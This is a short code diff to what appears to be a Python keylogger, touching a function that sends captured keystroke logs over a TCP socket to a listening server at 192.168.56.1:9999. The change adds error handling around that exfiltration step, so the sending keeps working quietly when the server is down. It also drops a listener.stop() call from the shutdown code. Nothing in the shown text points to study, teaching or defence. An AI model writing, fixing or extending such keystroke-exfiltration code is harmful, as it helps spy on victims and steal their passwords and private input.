@@ -24,9 +24,12 @@ def keyPressed(key):
 def send_log_to_server(log_data):
     server_ip = '192.168.56.1'  # Replace with your server's IP address
     server_port = 9999
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect((server_ip, server_port))
-        s.sendall(log_data.encode('utf-8'))
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.connect((server_ip, server_port))
+            s.sendall(log_data.encode('utf-8'))
+    except ConnectionRefusedError:
+        print(get_error_message("004"))
 
 def write_log():
     global keys_pressed
@@ -48,4 +51,3 @@ if __name__ == "__main__":
             time.sleep(0.1)  # Write log every 0.1 seconds
     except KeyboardInterrupt:
         cleanup()
-        listener.stop()
